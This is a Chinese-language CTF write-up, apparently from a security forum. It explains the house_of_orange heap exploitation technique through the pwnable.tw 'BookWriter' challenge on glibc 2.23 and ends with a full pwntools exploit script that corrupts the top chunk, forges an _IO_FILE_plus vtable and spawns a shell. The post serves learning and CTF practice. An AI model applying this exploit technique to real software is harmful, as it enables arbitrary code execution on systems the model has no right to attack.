
# [原创]从`BookWriter`看`house_of_orange`原理【新手向】

## 0x00 背景

最近在学习`house_of_orange`技术，`house_of_orange`技术已经和`house_of_lore`、`house_of_Spirit`一样，成为一种堆溢出利用技巧，思路来自ctf-HITCON-2016的同名题目。最近学习到这里，看了github上`shellphish/how2heap`中的讲解和多篇题解对漏洞触发条件依然不太理解，恰巧做到了`pwnable.tw`上的`BookWriter`题目，真正实践了一次。

## 0x01 题目分析

首先这是一道逻辑清晰的题目，主要有添加书页、浏览书页、编辑书页和查看信息功能。

![](https://bbs.kanxue.com/upload/attach/201712/777876_a3lfeibytv7ptvr.jpg)

其中定义了两个`int[8]`数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。

1. 添加操作使用从0~8顺序查找的方式，进行堆块申请，堆块大小由用户输入，并且用户此时可获得一次输入堆块内容的机会。

![](https://bbs.kanxue.com/upload/attach/201712/777876_prtxvkft75yjw01.jpg)

2. 查看书页内容操作，用户可输入0~7的数字查询书页内容。

![](https://bbs.kanxue.com/upload/attach/201712/777876_nwrt20pgu5s83op.jpg)

3. 编辑操作，用户同样可输入0~7数字，根据存储在`size`数组的大小进行写入，并利用`strlen`函数，重新更新书页的`size`值。

![](https://bbs.kanxue.com/upload/attach/201712/777876_kl3z38db2a7npj6.jpg)

4. 查看信息。打印一系列信息。

![](https://bbs.kanxue.com/upload/attach/201712/777876_hu145nhn0wdnf2u.jpg)

题目中给出的`libc.so`版本是 2.23.

![](https://bbs.kanxue.com/upload/attach/201712/777876_43mv28bpsqga0vq.jpg)

## 0x02 漏洞分析

1. 堆地址泄露

可以主要到BSS段上的排列顺序是`char author_name[0x40]`、`int page[8]`、`int page_size[8]`。在输入`author_name`时，输入长度是0x40，打印时使用`%s`，造成泄露`page`中存储的堆地址。

2. 堆溢出

堆溢出漏洞有两处，第一处在`edit`函数中，用户输入完数据后，程序使用`strlen`函数重置`page_size`的值，当用户输入与下一堆块中的`size`相连时，`strlen`会返回用户输入长度+下一堆块`size`，再次编辑造成了下一堆块的`size`被篡改。第二处在于`add`函数中对允许写入的判断是`i<=8,page[i]==NULL`。可以发现`&page[8] = &page[0]`的地址，当`page[0]`被覆盖为一个堆块地址时，造成了对`page[0]`超长写入，可以覆盖到很远的地址,可以说是一个等号引发的血案了。

## 0x03 漏洞利用

整个程序中没有出现`free`函数，常规的UAF、Double free都不存在。看了很多的`house_of_orange`资料，恰好想到使用这种方法，这种攻击成功需要如下条件（shellphish上提供的方法）：

1. heap地址

2. 堆溢出

3. libc地址

4. libc 2.23及以下版本（2.24版本开始对vtable有check，不过也可以绕过）

`house_of_orange`思路简介：

1. 首先修改top块的`size`，然后申请一个较大的块（不大于`mmap`申请的阈值，大于top块当前大小），当修改的`size`满足一定条件时，原来的top会被释放到`unsorted bin`。

2. 通过堆溢出覆写原top内容，主要是构造`_IO_FILE_plus`指针中的函数虚表，并伪造`bk`指针为`unsorted bin`攻击做铺垫。

3. 当再次申请内存时，造成`unsorted bin attack`，将`_IO_list_all`覆写为原top头地址，由于`unsorted bin`结构的破坏，程序异常，会在`malloc`中调用`malloc_printerr`函数进行错误打印，在`malloc_printerr`中调用`__libc_message`，进一步调用`abort()`，再调用`_IO_flush_all_lockp()`，在其中调用了`_IO_OVERFLOW(fp,EOF)`，这个函数是使用虚表调用，如果可以覆盖调用的虚表，就可以达到执行`system('/bin/sh')`。

针对上述步骤可以在这道题中一一对照实现。

首先是修改top块的`size`，可以通过`add`一个块，`edit`两次进行对top头`size`的覆写，经过修改，top的地址与大小如图所示：

![](https://bbs.kanxue.com/upload/attach/201712/777876_wprx55sc0w2frbh.jpg)

这个`size`块覆写必须满足以下要求，top块才可被释放到`unsorted bin`：

1. `size>=MINSIZE`
2. `pre_inuse`
3. `top地址+size-1`是页对齐的（以`000`结尾，比如此题中`0x187a020+0xfe1-1 = 0x187b000`）

![](https://bbs.kanxue.com/upload/attach/201712/777876_jdprmv0go7uj1hk.jpg)

当满足这一点时，再次申请一个较大堆块时就会把这个top块释放到`unsorted bin`中，值得注意的是，此题有一个在`info`函数中调用了`scanf`函数，`scanf`内部会申请一个0x1000大小的块，且不释放，就可以达到将原top头释放到`unsorted bin`的目的，并且此函数可以泄露堆地址。

![](https://bbs.kanxue.com/upload/attach/201712/777876_8smxmvmvzpnma57.jpg)

![](https://bbs.kanxue.com/upload/attach/201712/777876_v0vc8k5mmg7eabe.jpg)

由于申请小堆块是从`unsorted bin`直接切割，可以通过分配得到的堆块泄露`libc`地址（`main_arena+88`）。

接下来就可以堆溢出构造`unsorted bin`攻击了。

首先看漏洞的触发，在`genops.c`的`_IO_flush_all_lockp (int do_lock)`函数中，`fp`会从`_IO_list_all`开始，当不满足某条件时，循环修改`fp = fp->chain`，执行`_IO_OVERFLOW`，`_IO_list_all`是一个`_IO_FILE_plus`类型的指针，在libc中。

![](https://bbs.kanxue.com/upload/attach/201712/777876_zmm8u0cq7gfm6ac.jpg)

查看`_IO_list_all`内容，`_IO_list_all`是一个`_IO_FILE_plus`指针，指向`_IO_2_2_stdout`，

其中包含一个虚表`vtable`，用于函数调用，包括许多函数

![](https://bbs.kanxue.com/upload/attach/201712/777876_bzsvrr6u56q9huk.jpg)

![](https://bbs.kanxue.com/upload/attach/201712/777876_df3zpvviup8jj4e.jpg)

因此，思路可以是通过`unsorted bin`，将`_IO_list_all`指针内容修改，可以改到`main_arena+88`也就是`unsorted bin`头的地址，当改成这个地址时，其内容不满足执行`_IO_OVERFLOW`，转而去寻找位于`chain`这个位置的地址，继续执行。为了继续构造，可以把这个地方的地址写成我们能控制内存的地址，这个位置是`main_arena+216`，是在`fastbin`链中，堆块大小为0x60的`fastbin`的地址，可以通过把`unsorted bin`中的原top挂到`fastbin`的方法来进一步利用，可把原top头的地址修改成0x61，并且修改`bk`指针为`&_IO_list_all-0x10`。这样通过`malloc`新建堆块时，由于`unsorted bin`中的堆块不唯一，就会把`unsorted bin`中堆块释放到`bin`中去，释放原top头时，会把该块挂载到`fastbin[4]`，也就是我们期待的位置去，然后再处理`bk`指针，也就是`_IO_list_all`，会触发堆块大小为0的错误，进一步触发`malloc_printerr`等一系列函数...

![](https://bbs.kanxue.com/upload/attach/201712/777876_d5mw30cs7wiz4a0.jpg)

![](https://bbs.kanxue.com/upload/attach/201712/777876_p47u5tbvikqlc0k.jpg)

下一步就是在原top内伪造`_IO_FILE_plus`结构体，满足

1. `fp->mode>0`

2. `_IO_vtable_offset (fp) ==0`

3. `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`

即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化）

![](https://bbs.kanxue.com/upload/attach/201712/777876_7u7p7az1d3p93kj.jpg)

![](https://bbs.kanxue.com/upload/attach/201712/777876_dxkyc1nfy7zz1wm.jpg)

最终`malloc`一个堆块即可触发漏洞，获得`shell`

## 0x04 EXP

```python
from pwn import *

debug = 1

elf = ELF('./bookwriter')

if debug:

	p = process('./bookwriter')

	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

	context.log_level = 'debug'

	

else:

	pass



def add(num,content):

	p.recvuntil('Your choice :')

	p.sendline('1')

	p.recvuntil('Size of page :')

	p.sendline(str(num))

	p.recvuntil('Content :')

	p.send(content)

def view(num):

	p.recvuntil('Your choice :')

	p.sendline('2')

	p.recvuntil('Index of page :')

	p.sendline(str(num))

def edit(num,content):

	p.recvuntil('Your choice :')

	p.sendline('3')

	p.recvuntil('Index of page :')

	p.sendline(str(num))

	p.recvuntil('Content:')

	p.send(content)

def info(num,content):

	p.recvuntil('Your choice :')

	p.sendline('4')

	p.recvuntil('(yes:1 / no:0) ')

	p.sendline(str(num))

	if(num):

		p.recvuntil('Author :')

		p.sendline(content)

	else:

		pass

def leak_heap():

	p.recvuntil('Your choice :')

	p.sendline('4')

	p.recvuntil('a'*0x40)

	result = u64(p.recvline()[0:-1].ljust(8,'\0'))

	p.recvuntil('(yes:1 / no:0) ')

	p.sendline('0')

	return result #int(resultq[0:-1],10)

#gdb.attach(p,'b *0x400bdd')

p.recvuntil('Author :')

p.sendline('a'*0x40)

add(0x18,'a'*0x18)   #0

edit(0,'a'*0x18)

edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')

heap_addr = leak_heap()

for i in range(8):

	add(0x40,'p4nda123')#2

view(2)

p.recvuntil('p4nda123')

libc_addr  = u64(p.recvline()[0:-1].ljust(8,'\0'))





libc.address = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']

print 'libc_addr:',hex(libc_addr)

print 'system: ',hex(libc.symbols['system'])

print 'heap: ',hex(heap_addr)

edit(0,'\0'*0x290+'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)+p64(0)*9+p64(libc.symbols['system']) + p64(0)*11 + p64(heap_addr+0x120+0x60+0x170) )



p.recvuntil('Your choice :')

p.sendline('1')

p.recvuntil('Size of page :')

p.sendline(str(0x10))

p.interactive()
```

如有理解有误之处，希望大佬们指出改正...

参考：

38fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0R3@1z5e0R3%4

d13K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6\*7K9s2g2S2L8X3I4S2L8W2)9J5k6i4A6Z5K9h3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0x3I4x3o6M7&6x3U0j5@1i4K6y4r3N6i4c8E0i4K6g2X3L8h3g2V1K9i4g2E0i4K6y4p5M7$3!0U0K9h3q4D9i4K6t1$3j5h3#2H3i4K6y4n7N6i4c8E0i4K6g2X3M7$3!0#2M7X3y4W2i4K6y4p5M7i4p5`.

27aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4F1j5X3I4G2k6%4y4Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3q4F1k6%4W2W2i4K6u0r3M7q4)9J5c8U0j5J5y4U0R3&6z5o6q4Q4x3X3g2Z5N6r3#2D9

2e9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3g2D9L8s2m8Z5K9i4y4Z5i4K6u0r3K9r3!0%4x3X3S2W2j5i4m8Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3K9r3!0#2M7$3g2Q4y4h3k6G2k6W2)9#2k6X3!0J5j5h3&6Y4k6g2)9J5k6h3x3`.

55cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2K6L8%4g2J5j5$3g2%4j5i4u0W2i4K6u0W2L8%4u0Y4i4K6u0r3L8h3I4Q4x3V1k6D9K9h3u0U0i4K6u0V1j5h3I4H3K9r3q4Q4x3V1j5J5x3o6p5$3i4K6u0V1x3o6u0Q4x3V1k6E0M7$3M7H3x3o6f1H3x3W2)9J5k6h3S2@1L8h3H3`.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [bookwriter.zip](javascript:void(0);)

  （775.39kb，31次下载）
